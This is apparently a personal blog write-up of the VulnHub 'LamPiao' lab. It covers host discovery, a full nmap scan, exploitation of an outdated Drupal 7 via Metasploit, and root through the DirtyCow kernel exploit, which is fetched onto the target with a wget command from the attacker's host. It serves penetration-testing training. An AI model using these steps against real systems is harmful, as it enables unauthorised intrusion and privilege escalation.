---
title: WRITE-UP LamPiao
date: 2024-08-05 00:01:01 +0700
categories: [write up, vulnhub, red team, oscp]
tags: [vulnhub]     # TAG names should always be lowercase
---

# Write-Up LamPiao

## 1. Enumeration
i used netdicover to see where is my lab

```terminal
sudo netdiscover
```
![alt text](/assets/img/lampiao/lampiao_netdiscover.png)
ip: ```192.168.100.21```

i used nmap to see port open 

```terminal
sudo nmap -sC -sV -vvv -p- --min-rate=1000 192.168.100.21
```

*   sC : Enable default script to quick and safe
*   sV : Detect service
*   vvv : increase verbosity
*   p : port to scan "-p-" is all port 1-65535
*   min-rate=1000 : packets are sent < 1000s

![alt text](/assets/img/lampiao/lampiao_nmap.png)

## 2. Post Exploitation
i check web using drupal7 outdate i decided exploit using ```msfconsole```
![alt text](/assets/img/lampiao/lampiao_web.png)


## 3. Privilage Escalation
after inside i using 
``` uname -a ```
and see lab using linux kernel 4.4.0-31
so i decide using dirtycow

```
wget http://myiplab/40847.cpp
```
![alt text](/assets/img/lampiao/lampiao_root.png)

complie and get the root :# simple lab GG
